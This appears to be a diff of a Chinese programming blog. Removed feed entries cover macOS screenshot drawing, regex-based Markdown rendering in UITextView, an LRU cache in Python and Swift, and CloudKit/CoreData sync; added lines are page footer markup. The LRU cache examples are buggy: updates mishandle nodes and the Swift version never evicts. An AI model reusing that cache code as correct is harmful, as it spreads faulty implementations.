-        // 从字典中移除对应任务
-        self.items.removeValue(forKey: &quot;\(indexPath.row)&quot;)
-    }
-
-}
-</code></pre>
-<p>可以看到，已经没有了离屏渲染的现象：</p>
-<figure data-type="image" tabindex="2"><img src="https://hagemon.github.io/post-images/1614267273643.PNG" alt="" width="300" loading="lazy"></figure>
-<p>在Instrument中滚动也保持着60的FPS。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Clipin Log 7. 提升截屏流畅度]]></title>
-        <id>https://hagemon.github.io/post/clipin-post-7/</id>
-        <link href="https://hagemon.github.io/post/clipin-post-7/">
-        </link>
-        <updated>2021-02-24T15:23:36.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="旧版本">旧版本</h1>
-<p>在之前的版本中，我在一个ClipView上对暗色背景和高亮区域绘制：</p>
-<pre><code class="language-swift">override func draw(_ dirtyRect: NSRect) {
-    
-    super.draw(dirtyRect)
-
-    // Drawing code here.
-    guard let image = self.image, let drawingRect = self.drawingRect else {
-        return
-    }
-    image.draw(in: self.bounds, operation: .sourceOver, fraction: 0.5) // 绘制背景
-    var rect = NSIntersectionRect(drawingRect, self.bounds)  // 取高亮区域和页面的交集区域
-    rect = NSIntegralRect(rect)  // 区域取整，为了防止抖动问题
-
-            // 取屏幕图像中高亮区域部分渲染在view上，使用.sourceOver操作
-            // 由于source图像是alpha为1，所以渲染结果即是区域图像本身
-    image.draw(in: rect, from: rect, operation: .sourceOver, fraction: 1.0)
-}    
-</code></pre>
-<h1 id="新版本">新版本</h1>
-<p>将背景View和高亮区域View分离，在NSWindow中分别添加两个view：</p>
-<pre><code class="language-swift">import Cocoa
-
-class ClipWindow: NSWindow {
-    
-    var rectView: RectView
-    var backView: BackView
-    
-    init(contentRect: NSRect, backView: BackView, rectView: RectView) {
-        self.rectView = rectView
-        self.backView = backView
-
-        super.init(contentRect: contentRect, styleMask: .borderless, backing: .buffered, defer: false)
-        self.contentView?.addSubview(backView)
-        self.contentView?.addSubview(rectView)
-        self.level = .statusBar
-    }
-    
-}
-</code></pre>
-<h2 id="绘制高亮区域">绘制高亮区域</h2>
-<pre><code class="language-swift">import Cocoa
-
-class RectView: NSView {
-    
-    var image: NSImage?
-    var drawingRect: NSRect?
-    var showDots = false
-    var paths: [(NSBezierPath, DotType)] = []
-    
-    override func draw(_ dirtyRect: NSRect) {
-        super.draw(dirtyRect)
-
-        // Drawing code here.
-        guard let image = self.image,
-              let drawingRect = self.drawingRect
-        else {
-            return
-        }
-        var rect = NSIntersectionRect(drawingRect, self.bounds)
-        rect = NSIntegralRect(rect)
-        image.draw(in: rect, from: rect, operation: .sourceOver, fraction: 1.0)
-        if self.showDots {
-            self.drawDots(rect: rect)
-        }
-    }
-    
-    private func drawDots(rect: NSRect) {
-        let radius: CGFloat = 1.5
-        let dots = self.getDotsCoord(with: rect, radius: radius)
-        self.paths = []
-        for (dot, type) in dots {
-            let path = NSBezierPath(ovalIn: NSRect(origin: dot, size: CGSize(width: radius*2, height: radius*2)))
-            self.paths.append((path, type))
-            path.lineWidth = 3
-            NSColor.white.set()
-            path.stroke()
-        }
-    }
-    
-    func getDotsCoord(with rect:NSRect, radius: CGFloat) -&gt; [(NSPoint, DotType)] {
-        let width = rect.width
-        let height = rect.height
-        let origin = rect.offsetBy(dx: -radius, dy: -radius).origin
-        let dots: [(NSPoint, DotType)] = [
-            (origin, .corner),
-            (origin.offsetBy(dx: width/2, dy: 0), .bottom),
-            (origin.offsetBy(dx: 0, dy: height/2), .left),
-            (origin.offsetBy(dx: width, dy: 0), .corner),
-            (origin.offsetBy(dx: 0, dy: height), .corner),
-            (origin.offsetBy(dx: width, dy: height/2), .right),
-            (origin.offsetBy(dx: width/2, dy: height), .top),
-            (origin.offsetBy(dx: width, dy: height), .corner)
-        ].map({
-            (point, type) in
-            return (NSPoint(x: Int(point.x), y: Int(point.y)), type)
-        })
-        return dots
-    }
-    
-}
-
-</code></pre>
-<h2 id="绘制背景">绘制背景</h2>
-<pre><code class="language-swift">
-import Cocoa
-
-class BackView: NSView {
-
-    var image: NSImage?
-
-    override func draw(_ dirtyRect: NSRect) {
         
-        super.draw(dirtyRect)
-
-        // Drawing code here.
-        guard let image = self.image,
-              let window = self.window
-        else {
-            return
-        }
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://hagemon.github.io/post/UGJoU8sf/" class="post-title gt-a-link">
+                    网络攻防tips
+                </a>
+            </div>
         
-        let originFrame = NSRect(origin: .zero, size: window.frame.size)
-        image.draw(in: originFrame, from: originFrame, operation: .sourceOver, fraction: 0.5)
 
-    }
-    
-}
+        
 
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Swift5：基于正则表达式实现简单的Markdown即时渲染]]></title>
-        <id>https://hagemon.github.io/post/ojcJsWljZ/</id>
-        <link href="https://hagemon.github.io/post/ojcJsWljZ/">
-        </link>
-        <updated>2021-02-13T15:23:44.000Z</updated>
-        <content type="html"><![CDATA[<p>本文以iOS下的UITextView为例，在MacOS上只要更改NSTextView的相应的接口名同样适用。</p>
-<h1 id="实现思路">实现思路</h1>
-<p>我在实现过程中尝试了局部实时渲染和全局实时渲染的方式，由于学艺不精，暂时没有找到很好的方法进行局部实时渲染，这里介绍一下我对于两种方法的思路。</p>
-<h2 id="局部实时渲染">局部实时渲染</h2>
-<p>最早的思路是根据用户的输入位置对应的段落，更新<code>NSMutableAttributedString</code>，具体步骤如下：</p>
-<ul>
-<li>监听<code>textViewDidChange</code></li>
-<li>找到光标对应的段落</li>
-<li>根据段落内容，基于正则表达式分析并对应文字的<code>attribute</code></li>
-</ul>
-<p>但是按照这种思路，在替换文字是会导致<code>attribute</code>的混乱。<code>attribute</code>的形式是<code>属性:Range</code>的形式，在更新了文本以后，所有的文本range位置都会发生变化。我暂时没有找到一个很方便的方法来局部更新<code>NSMutableAttributedString</code>的属性。</p>
-<h2 id="全局实时渲染">全局实时渲染</h2>
-<p>全局实时渲染指在监听文本变化后更新整个文本的<code>attribute</code>，这样会带来一些性能的损失，但是更易于实现。主要的思路如下：</p>
-<ul>
-<li>监听<code>textViewDidChange</code></li>
-<li>重新解析所有文字的<code>attribute</code>并更新</li>
-</ul>
-<p>我们首先需要封装一个正则表达式的工具<strong>RE</strong>。</p>
-<h1 id="正则表达式工具re">正则表达式工具RE</h1>
-<p>RE的主要功能包括：</p>
-<ol>
-<li>匹配并获取<code>Regex</code>对应的内容</li>
-<li>替换<code>Regex</code>所匹配的内容</li>
-<li>匹配并获取<code>Regex</code>对应的内容及其范围(<code>NSRange</code>)</li>
-</ol>
-<p>首先封装一个RE返回的结构体</p>
-<pre><code class="language-swift">struct Parsed {
-    var content: String
-    var range: NSRange
-}
-</code></pre>
-<pre><code class="language-swift">class RE: NSObject {
-    static func regularExpression(validateString:String, inRegex regex:String) -&gt; [String]{
-        // 匹配并获取内容
-        do {
-            let re: NSRegularExpression = try NSRegularExpression(pattern: regex, options: [])
-            let matches = re.matches(in: validateString, options:[], range: NSRange(location: 0, length: validateString.count))
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first"></div>
+    <div class="social-container">
+        
             
-            var data:[String] = Array()
-            for item in matches {
-                let string = (validateString as NSString).substring(with: item.range)
-                data.append(string)
-            }
+                <a href="https://hagemon.github.com" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
             
-            return data
-        }
-        catch {
-            return []
-        }
-    }
-
-    static func regularExpressionRange(validateString:String, inRegex regex:String) -&gt; [Parsed]{
-        // 匹配并获取内容和范围
-        do {
-            let re: NSRegularExpression = try NSRegularExpression(pattern: regex, options: [])
-            let matches = re.matches(in: validateString, options:[], range: NSRange(location: 0, length: validateString.count))
+        
             
-            var data:[Parsed] = Array()
-            for item in matches {
-                let string = (validateString as NSString).substring(with: item.range)
-                data.append(Parsed(content: string, range: item.range))
-            }
+                <a href="https://twitter.com/oneFolder_" target="_blank">
+                    <i class="fab fa-twitter gt-c-content-color-first"></i>
+                </a>
             
-            return data
-        }
-        catch {
-            return []
-        }
-    }
-    
-    static func replace(validateString: String, withContent content: String, inRegex regex:String) -&gt; String {
-        do {
-            let re: NSRegularExpression = try NSRegularExpression(pattern: regex, options: [])
-            return re.stringByReplacingMatches(in: validateString, options: [], range: NSRange(location: 0, length: validateString.count), withTemplate: content)
-        } catch {
-            return validateString
-        }
-    }
-</code></pre>
-<h1 id="regex">Regex</h1>
-<p>我暂时实现了以下几个markdown语法的识别：</p>
-<ul>
-<li>Header</li>
-<li>带序号列表</li>
-<li>无序号列表</li>
-</ul>
-<p>我们需要识别出<code>textView</code>中各种类型文本及其所在的<code>NSRange</code>，对于每种类型，我们用以下几个<code>Regex</code>进行识别：</p>
-<pre><code class="language-swift">static let orderListBlockRegex = &quot;(?&lt;=(^|\n))([0-9]+\\..*(\n)?)*(?&lt;=(^|\n))([0-9]+\\..*)+&quot;
-static let bulletBlocksRegex = &quot;(?&lt;=(^|\n))-.*(\n)?&quot;
-static let headerBlocksRegex = &quot;(?&lt;=(^|\n))#{1,3}.*(\n)?&quot;
-</code></pre>
-<p>这三个<code>Regex</code>可以识别出多个连续的文本块(Block)何其对应的<code>NSRange</code>。</p>
-<h1 id="mdparser">MDParser</h1>
-<p>我封装了一个简单的Markdown解析器，返回输入的<code>String</code>经过解析后的<code>NSAttributedString</code>，具体步骤包括：</p>
-<ol>
-<li>为所有文本设置默认样式</li>
-<li>匹配标题并添加样式</li>
-<li>匹配有序列表，自动排序后添加样式</li>
-<li>匹配无需列表</li>
-<li>为特殊字符添加样式</li>
-</ol>
-<pre><code class="language-swift">
-class MDParser: NSObject {
-    
-    // 在单行文本中识别三种类型的文本
-    static let headerRegex = &quot;^#{1,3}&quot;
-    static let orderRegex = &quot;^[0-9]+\\.&quot;
-    static let bulletRegex = &quot;^-&quot;
-
-    // 在多行文本中是被三种类型的文本块
-    static let orderListBlockRegex = &quot;(?&lt;=(^|\n))([0-9]+\\..*(\n)?)*(?&lt;=(^|\n))([0-9]+\\..*)+&quot;
-    static let bulletBlocksRegex = &quot;(?&lt;=(^|\n))-.*(\n)?&quot;
-    static let headerBlocksRegex = &quot;(?&lt;=(^|\n))#{1,3}.*(\n)?&quot;
-
-    // 用于给特殊字符（#，-，1.）添加样式
-    static let specielRegex = &quot;(?&lt;=(^|\n))(#{1,3}|[0-9]+\\.|-)&quot;
-    
-    // 渲染函数
-    static func renderAll(content: String) -&gt; NSAttributedString {
-        let result = NSMutableAttributedString(string: content, attributes: self.normalAttribute())
-        // 渲染 headers
-        let headers = RE.regularExpressionRange(validateString: content, inRegex: self.headerBlocksRegex)
-        for parsed in headers {
-            // 获取header的等级
-            let level = self.getHeaderLevel(header: parsed.content)
-            // 获取header的样式
-            let attributes = self.headerAttribute(level: level)
-            result.addAttributes(attributes, range: parsed.range)
-        }
         
-        // 渲染有序列表
-        let orderedList = RE.regularExpressionRange(validateString: content, inRegex: self.orderListBlockRegex)
-        for parsed in orderedList {
-            // 自动排序
-            let replaced = RE.replace(validateString: parsed.content, withContent: &quot;&quot;, inRegex: &quot;(?&lt;=(^|\n))[0-9]+&quot;)
-            var splited = replaced.split(separator: &quot;\n&quot;)
-            splited = splited.enumerated().map({(i, line) in &quot;\(i+1)&quot;+line})
-            let s = splited.joined(separator: &quot;\n&quot;)
-            result.mutableString.replaceCharacters(in: parsed.range, with: s)
-            // 获取并渲染有序列表样式
-            result.addAttributes(self.listAttribute(), range: parsed.range)
-        }
-
-        // 渲染无需列表
-        let bulletList = RE.regularExpressionRange(validateString: content, inRegex: self.bulletBlocksRegex)
-        for parsed in bulletList {
-            // 获取并渲染无需列表样式
-            result.addAttributes(self.listAttribute(), range: parsed.range)
-        }
-
-        // 高亮特殊字符
-        for parsed in RE.regularExpressionRange(validateString: content, inRegex: self.specielRegex) {
-            result.addAttributes([
-                .foregroundColor: UIColor(named: &quot;AccentColor&quot;)!
-            ], range: parsed.range)
-        }
+            
         
-        return result
-    }
-    
-    // ....
-    
-}
-</code></pre>
-<p>其中，获取<code>header</code>级别以及三种样式的代码为:</p>
-<pre><code class="language-swift">// 获取header级别
-static func getHeaderLevel(header: String) -&gt; Int {
-    guard let signs = RE.regularExpression(validateString: header, inRegex: &quot;^#{1,3}&quot;).first else { return 0 }
-    return signs.count
-}
-
-// MARK: - Attributes
-// PARAGRAGH_LEVELS和FONT_LEVELS是自定义的全局数组，存储了各级别对应的Spacing和FontSize
-private static func headerAttribute(level: Int) -&gt; [NSAttributedString.Key: Any] {
-    let paraStyle = NSMutableParagraphStyle()
-    paraStyle.paragraphSpacingBefore = PARAGRAGH_LEVELS[level]
-    paraStyle.paragraphSpacing = PARAGRAGH_LEVELS[level]
-    let font = UIFont.boldSystemFont(ofSize: FONT_LEVELS[level])
-    return [
-        .font: font,
-        .paragraphStyle: paraStyle,
-        .foregroundColor: UIColor.label
-    ]
-}
-
-private static func listAttribute() -&gt; [NSAttributedString.Key: Any] {
-    let paraStyle = NSMutableParagraphStyle()
-    paraStyle.firstLineHeadIndent = 5
-    paraStyle.paragraphSpacingBefore = 3
-    paraStyle.paragraphSpacing = 3
-    return [
-        .font: UIFont.systemFont(ofSize: FONT_LEVELS[0]),
-        .paragraphStyle: paraStyle,
-        .foregroundColor: UIColor.label
-    ]
-}
-
-private static func normalAttribute() -&gt; [NSAttributedString.Key: Any] {
-    return [
-        .font: UIFont.systemFont(ofSize: FONT_LEVELS[0]),
-        .foregroundColor: UIColor.label
-    ]
-}
-</code></pre>
-<h1 id="实时渲染">实时渲染</h1>
-<p>在<code>ViewController</code>中定义<code>refresh()</code>函数，对<code>textView</code>的文本进行渲染，可以在<code>textViewDidChange</code>中调用<code>refresh()</code>函数：</p>
-<pre><code class="language-swift">final func refresh() {
-    let selectedRange = self.textView.selectedRange // 保存当前光标位置
-    let textStorage = self.textView.textStorage
-    textStorage.setAttributedString(MDParser.renderAll(content: self.textView.text))
-    self.textView.selectedRange = selectedRange // 恢复光标位置
-}
-</code></pre>
-<p>因为在设置<code>AttributedString</code>后，光标会自动移动到最后一个字符，所以需要保存&amp;恢复光标的位置。</p>
-<pre><code class="language-swift">func textViewDidChange(_ textView: UITextView) {
-    if self.textView.markedTextRange == nil {
-        self.refresh()
-    }
-}
-</code></pre>
-<p>值得注意的是，使用中文（或是别的语言）输入法时，未键入空格也会触发<code>textViewDidChange</code>，如果此时直接刷新，则会让输入法无法使用，并直接将刚才键入的文本添加到<code>textView</code>中。</p>
-<p>使用输入法时，<code>textView</code>会将正在输入的部分以<code>markedText</code>的形式暂存，所以判定<code>self.textView.markedTextRange</code>为空时才需要更新样式。</p>
-<h1 id="为ios设计markdown的便捷按钮">为iOS设计markdown的便捷按钮</h1>
-<p>在使用iOS端输入时，对于特殊字符（#、-或1.）的输入是十分麻烦的，所以我通过使用<code>textView</code>的<code>inputAccessoryView</code>提供了便捷的操作。</p>
-<figure data-type="image" tabindex="1"><img src="https://hagemon.github.io/post-images/1613312065248.PNG" alt="" width="200" loading="lazy"></figure>
-<p>便捷按钮的具体事件流程如下：</p>
-<ul>
-<li>点击按钮</li>
-<li>获取光标所在段落</li>
-<li>为段落添加样式</li>
-<li>刷新页面</li>
-</ul>
-<p>对于不同的样式类别，也会有不同的样式更替效果：</p>
-<ul>
-<li>Header：每次点击让header的级别按照0、1、2、3循环变化</li>
-<li>Ordered：每次点击为段落添加或取消序号</li>
-<li>Bullet：每次点击为段落添加或取消无序列表符</li>
-</ul>
-<p>为了实现这些功能，需要从这几个方面考虑。</p>
-<h2 id="获取段落">获取段落</h2>
-<p>根据光标位置，分别向前和向后寻找段落的头尾位置（对于首段或是尾段，需要寻找文档的头尾），具体来说，使用<code>textView.tokenizer.position(from: toBoundary: inDirection: )</code>方法来寻找段落或文档的头尾。</p>
-<p>因为<code>position</code>函数是通过寻找到上一个段落的结尾符号（也就是<code>\\n</code>)来定位段落的起始位置，所以对于第一个段落是找不到起始位置的，此时则需要找到文档的起始位置作为该段的起始位置。</p>
-<pre><code class="language-swift">final func getLineRange() -&gt; UITextRange? {
-    guard let range = self.textView.selectedTextRange
-    else { return nil }
-    // 以光标位置为起点
-    let position = range.start
-    // 向前寻找段落的边界（也就是段落起始位置）
-    var start = self.textView.tokenizer.position(from: position, toBoundary: .paragraph, inDirection: UITextDirection(rawValue: UITextStorageDirection.backward.rawValue))
-    // 若找不到，则将文档起点作为start
-    if start == nil {
-        start = self.textView.beginningOfDocument
-    }
-    // 向后寻找段落的边界
-    var end = self.textView.tokenizer.position(from: position, toBoundary: .paragraph, inDirection: UITextDirection(rawValue: UITextStorageDirection.forward.rawValue))
-    // 若找不到，则将文档终点作为end
-    if end == nil {
-        end = self.textView.endOfDocument
-    }
-    return self.textView.textRange(from: start!, to: end!)
-}
-</code></pre>
-<p>对于三种类型的按钮，分别调用其<code>update</code>的方法更新段落：</p>
-<pre><code class="language-swift">@objc func headerAction() {
-    guard let range = self.getLineRange(),
-            let text = self.textView.text(in: range)
-    else { return }
-    self.textView.replace(range, withText: MDParser.updateHeader(s: text))
-}
-
-@objc func orderAction() {
-    guard let range = self.getLineRange(),
-            let text = self.textView.text(in: range)
-    else { return }
-    self.textView.replace(range, withText: MDParser.updateOrder(s: text))
-}
-
-@objc func bulletAction() {
-    guard let range = self.getLineRange(),
-            let text = self.textView.text(in: range)
-    else { return }
-    self.textView.replace(range, withText: MDParser.updateBullet(s: text))
-}
-</code></pre>
-<p>值得一提的是，在<code>replace</code>之后会触发<code>textViewDidChange</code>并自动刷新，所以不需要额外的刷新操作。</p>
-<h2 id="样式更新">样式更新</h2>
-<h3 id="header">Header</h3>
-<p>根据段落内容判断当前的Header等级，并让等级加一并取余：</p>
-<pre><code class="language-swift">static func updateHeader(s: String) -&gt; String {
-    if s == &quot;\n&quot; {return s+&quot;# &quot;}
-    let re = RE.regularExpression(validateString: s, inRegex: self.headerRegex)
-    if re.count == 0 {
-        return &quot;# &quot; + s
-    }
-    let level = re[0].count
-    var replaced = String(repeating: &quot;#&quot;, count: (level + 1) % 4)
-    if replaced.count &gt; 0 {
-        replaced += &quot; &quot;
-    }
-    return RE.replace(validateString: s, withContent: replaced, inRegex: self.headerRegex+&quot;[ ]*&quot;)
-}
-</code></pre>
-<h3 id="ordered">Ordered</h3>
-<p>判断段首是否为序号，若是则去除序号，否则添加序号。</p>
-<pre><code class="language-swift">static func updateOrder(s: String) -&gt; String {
-    if s == &quot;\n&quot; {return s+&quot;1. &quot;}
-    let order = RE.regularExpression(validateString: s, inRegex: self.orderRegex)
-    if order.count &gt; 0 {
-        return RE.replace(validateString: s, withContent: &quot;&quot;, inRegex: self.orderRegex+&quot;[ ]*&quot;)
-    }
-    // This would be auto reordered, using `1.` works fine.
-    return &quot;1. &quot;+s
-}
-</code></pre>
-<p>值得注意的是，由于在之后会自动刷新并重新排序，所以这里添加任意的序号都可以。</p>
-<h3 id="bullet">Bullet</h3>
-<p>和Ordered原理相同</p>
-<pre><code class="language-swift">static func updateBullet(s: String) -&gt; String {
-    if s == &quot;\n&quot; {return s+&quot;- &quot;}
-    let bullet = RE.regularExpression(validateString: s, inRegex: self.bulletRegex)
-    if bullet.count &gt; 0 {
-        return RE.replace(validateString: s, withContent: &quot;&quot;, inRegex: self.bulletRegex+&quot;[ ]*&quot;)
-    }
-    return &quot;- &quot;+s
-}
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[实现基于LRU的Cache]]></title>
-        <id>https://hagemon.github.io/post/2QEIz0KlH/</id>
-        <link href="https://hagemon.github.io/post/2QEIz0KlH/">
-        </link>
-        <updated>2021-02-06T14:58:25.000Z</updated>
-        <content type="html"><![CDATA[<p>LRU需要满足：</p>
-<ul>
-<li>O(1)时间的读写</li>
-<li>将最久未被使用的数据剔除</li>
-<li>剔除操作在写入的时候进行</li>
-</ul>
-<p>要满足这些条件，需要具备的数据结构特点：</p>
-<ul>
-<li>哈希表：O(1)读取</li>
-<li>链表：最近被使用的在表头</li>
-</ul>
-<p>所以使用双向链表+哈希表的组合作为cache结构。</p>
-<h1 id="python简易实现">Python简易实现</h1>
-<p>使用Python快速实现上述功能，包括数据结点、双向链表和Cache的实现。</p>
-<h2 id="数据结点">数据结点</h2>
-<pre><code class="language-python">class Node:
-    def __init__(self, key, val):
-        self.next = None
-        self.prev = None
-        self.key = key
-        self.val = val
-</code></pre>
-<h2 id="双向链表">双向链表</h2>
-<pre><code class="language-python">class BidirectionalList:
-    def __init__(self):
-        self.head = None
-        self.tail = None
-
-    # 添加结点到链表头
-    def add_node(self, node):
-        # 链表为空时设置头尾节点
-        if not self.head:
-            self.head = node
-            self.tail = node
-            return
-        node.next = self.head
-        self.head.prev = node
-        self.head = node
-
-    # 移除结点并返回
-    def remove_node(self, node):
-        if node.prev:
-            node.prev.next = node.next
-        else:
-            self.head = node.next
-        if node.next:
-            node.next.prev = node.prev
-        else:
-            self.tail = node.prev
-        node.prev, node.next = None, None
-        return node
-</code></pre>
-<h2 id="cache实现">Cache实现</h2>
-<pre><code class="language-python">class Cache:
-    def __init__(self, capacity):
-        self.capacity = capacity
-        self.b_list = BidirectionalList()
-        self.map = {}
-
-    def set(self, key, value):
-        node = Node(key=key, val=value)
-				if key in self.map:
-            self.b_list.add_node(self.b_list.remove_node(node))
-        self.map[key] = node
-        self.b_list.add_node(node)
-        if len(self.map) &gt; self.capacity:
-            node = self.b_list.remove_node(self.b_list.tail)
-            del self.map[node.key]
-
-    def get(self, key):
-        if key not in self.map:
-            return None
-        node = self.map[key]
-        self.b_list.remove_node(node)
-        self.b_list.add_node(node)
-        return node.val
-</code></pre>
-<h1 id="swift实现">Swift实现</h1>
-<p>基于LRU算法，支持范型的Cache实现</p>
-<h2 id="node">Node</h2>
-<pre><code class="language-swift">import Cocoa
-
-final class Node&lt;T&gt;: NSObject {
-    var key: String
-    var val: T
-    var next: Node?
-    var prev: Node?
-    
-    init(key: String, value: T) {
-        self.key = key
-        self.val = value
-        self.next = nil
-        self.prev = nil
-        super.init()
-    }
-}
-</code></pre>
-<h2 id="bidirectional-list">Bidirectional List</h2>
-<pre><code class="language-swift">import Cocoa
-
-final class BidirectionalList&lt;T&gt;: NSObject {
-    var head: Node&lt;T&gt;?
-    var tail: Node&lt;T&gt;?
-    var size = 0
-    
-    final func addFront(node: Node&lt;T&gt;) {
-        guard self.size &gt; 0,
-              let head = self.head
-        else {
-            self.head = node
-            self.tail = node
-            self.size = 1
-            return
-        }
-        head.prev = node
-        node.next = head
-        self.head = node
-        self.size += 1
-    }
-    
-    final func remove(node: Node&lt;T&gt;) -&gt; Node&lt;T&gt;{
-        if let prev = node.prev, let next = node.next {
-            prev.next = next
-            next.prev = prev
-        } else if let prev = node.prev {
-            prev.next = nil
-            self.tail = prev
-        } else if let next = node.next {
-            next.prev = nil
-            self.head = next
-        }
-        node.prev = nil
-        node.next = nil
-        return node
-    }
-    
-    final func hit(node: Node&lt;T&gt;) {
-        self.addFront(node: self.remove(node: node))
-    }
-}
-</code></pre>
-<h2 id="cache">Cache</h2>
-<pre><code class="language-swift">import Cocoa
-
-final class Cache&lt;T&gt;: NSObject {
-    let capacity: Int
-    var bList = BidirectionalList&lt;T&gt;()
-    var map: [String: Node&lt;T&gt;] = [:]
-    
-    init(capacity: Int) {
-        self.capacity = capacity
-    }
-    
-    final func set(value: T, for key:String) {
-        let node = Node(key: key, value: value)
-        if self.map.keys.contains(key) {
-            self.bList.hit(node: node)
-            return
-        }
-        self.bList.addFront(node: node)
-        self.map[key] = node
-    }
-    
-    final func get(key:String) -&gt; T? {
-        guard let node = self.map[key] else {
-            return nil
-        }
-        self.bList.hit(node: node)
-        return node.val
-    }
-    
-}
-</code></pre>
-<h2 id="usage">Usage</h2>
-<pre><code class="language-swift">let cache = Cache&lt;Int&gt;(capacity: 4)
-
-cache.set(value: 3, for: &quot;3&quot;)
-cache.set(value: 4, for: &quot;4&quot;)
-print(cache.get(key: &quot;4&quot;) ?? &quot;nil&quot;)
-</code></pre>
-<p>参考文章：<br>
-<a href="https://github.com/halfrost/Halfrost-Field/blob/master/contents/Go/LRU:LFU_interview.md">halfrost的文章</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Swift5+CloudKit+CoreData实现多终端同步]]></title>
-        <id>https://hagemon.github.io/post/swift5-xia-cloudkitcoredata-shi-xian-duo-zhong-duan-tong-bu/</id>
-        <link href="https://hagemon.github.io/post/swift5-xia-cloudkitcoredata-shi-xian-duo-zhong-duan-tong-bu/">
-        </link>
-        <updated>2021-02-04T14:42:18.000Z</updated>
-        <content type="html"><![CDATA[<p>CloudKit和CoreData的配置已经有很多资料了，这里不阐述。</p>
-<h1 id="preparation">Preparation</h1>
-<p>在基于CoreData和CloudKit的项目中，会在AppDelegate中自动生成container：</p>
-<pre><code class="language-swift">lazy var persistentContainer: NSPersistentContainer = {
-    
-    let container = NSPersistentContainer(name: &quot;Model&quot;)
-    
-    // get the default store description
-    guard let description = container.persistentStoreDescriptions.first else {
-        fatalError(&quot;Could not retrieve a persistent store description.&quot;)
-    }
-
-    // initialize the CloudKit schema
-    let id = &quot;iCloud.your.id&quot;
-            // 获取基于CloudKit的Options
-    let options = NSPersistentCloudKitContainerOptions(containerIdentifier: id)
-    description.cloudKitContainerOptions = options
-            // 用于跟踪merge的记录
-            description.setOption(true as NSNumber, forKey: NSPersistentHistoryTrackingKey)
-    container.persistentStoreDescriptions = [description]
-    container.loadPersistentStores(completionHandler: {
-        (storeDescription, error) in
-        if let error = error as NSError? {
-            fatalError(&quot;Unresolved error \(error), \(error.userInfo)&quot;)
-        }
-    })
-    return container
-}()
-</code></pre>
-<p>我使用了一个CoreUtil类封装了以下属性和方法：</p>
-<ul>
-<li>container</li>
-<li>context</li>
-<li>lastToken</li>
-<li>数据库操作</li>
-</ul>
-<pre><code class="language-swift">final class CoreUtil: NSObject {
-    
-    // MARK: - Core Data Context
-    static let container = (UIApplication.shared.delegate as! AppDelegate).persistentContainer
-    static let context = container.viewContext
-
-    // 暂时不展开token
-    static var lastToken: NSPersistentHistoryToken? = ...
-    static var tokenFile: URL = ...
-
-    // ..数据库操作
-    // ...
-}
-</code></pre>
-<h2 id="model">Model</h2>
-<p>Model中包含了三个属性：</p>
-<ul>
-<li>title</li>
-<li>content</li>
-<li>date</li>
-</ul>
-<h1 id="终端云端">终端→云端</h1>
-<p>当拥有了基于CloudKit的context时，所有的数据库操作在save之后都会自动同步到iCloud，所以只需要实现基本的CURD操作，就可以做到将数据同步到云端。</p>
-<pre><code class="language-swift">final class CoreUtil: NSObject {
-    
-    // MARK: - Core Data Context
-    // ...
-    
-    // MARK: - Database Operations
-
-    // Creation
-    static func create(title: String, content: String, date: Date) -&gt; CoreMemo {
-        let entity = NSEntityDescription.entity(forEntityName: &quot;Model&quot;, in: self.context)
-        let model = NSManagedObject(entity: entity!, insertInto: self.context) as! Model
-        model.setValue(title, forKey: &quot;title&quot;)
-        model.setValue(content, forKey: &quot;content&quot;)
-        model.setValue(date.toString(), forKey: &quot;date&quot;)
-        return model
-    }
-
-    // Removal
-
-    static func remove(model: Model) {
-        do {
-            self.context.delete(model)
-            try self.context.save()
-        } catch {
-            print(&quot;Delete \(model.title ?? &quot;nil&quot;) failed&quot;)
-            print(error)
-        }
-    }
-
-    // Retrieve
-
-    static func getModels() -&gt; [Model] {
-        let request = NSFetchRequest&lt;NSFetchRequestResult&gt;(entityName: &quot;Model&quot;)
-        // 按时间排序
-        request.sortDescriptors = [NSSortDescriptor(key: &quot;date&quot;, ascending: false)]
-        request.returnsObjectsAsFaults = false
-        do {
-            let result = try context.fetch(request) as! [Model]
-            // 尝试输出
-            for data in result {
-               print(data.value(forKey: &quot;title&quot;) as! String, data.value(forKey: &quot;date&quot;) as! String)
-            }
-            return result
-        } catch {
-            print(&quot;Load Failed&quot;)
-            return []
-        }
-    }
-    
-    // Saving &amp; Update
-
-    static func save() {
-        do {
-            try self.context.save()
-        } catch {
-            print(&quot;Store failed&quot;)
-        }
-    }
-    
-}
-</code></pre>
-<p>上述的数据库操作中没有修改(Update)操作，因为在修改对象的值之后，只需要保存当前的context既可以完成对数据库中数据的修改。</p>
-<p>我使用了Model的extension完成Model对象的修改操作（因为我使用了CoreData自动生成的Model类，所以看不到Model类的源代码）：</p>
-<pre><code class="language-swift">extension Model {
-    func update(content: String){
-        self.setValue(content, forKey: &quot;content&quot;)
-        // Parser.getTitle是我根据content获取标题的方法，大家可以自由发挥
-        self.setValue(Parser.getTitle(content: content), forKey: &quot;title&quot;)
-        self.setValue(Date.now().toString(), forKey: &quot;date&quot;)
-    }
-}
-</code></pre>
-<p>在App中对Model对象执行数据库操作后，数据会自动同步到iCloud中。</p>
-<h1 id="云端终端">云端→终端</h1>
-<p>我们在启动App以后，container会连接到iCloud并获取最新的数据。当云端数据变化时，App会收到从云端发来的变化通知，但在默认情况下并不会将数据合并（merge）到当前的context之中。</p>
-<p>我们使用iCloud的一个重要的需求就是实时地从iCloud获取其它设备对iCloud的修改，所以我们需要监听iCloud的行为，当其发送远端数据变化的通知时，执行相应的更新操作。</p>
-<h2 id="appdelegate">AppDelegate</h2>
-<p>为了监听远端的通知，需要为container的description添加新的参数：</p>
-<pre><code class="language-swift">description.setOption(true as NSNumber, forKey: NSPersistentHistoryTrackingKey)
-// 新的参数：表示是否接受远端变化的通知
-description.setOption(true as NSNumber, forKey: NSPersistentStoreRemoteChangeNotificationPostOptionKey)
-</code></pre>
-<h2 id="viewcontroller">ViewController</h2>
-<p>在ViewDidLoad中添加对事件的监听：</p>
-<pre><code class="language-swift">override func viewDidLoad() {
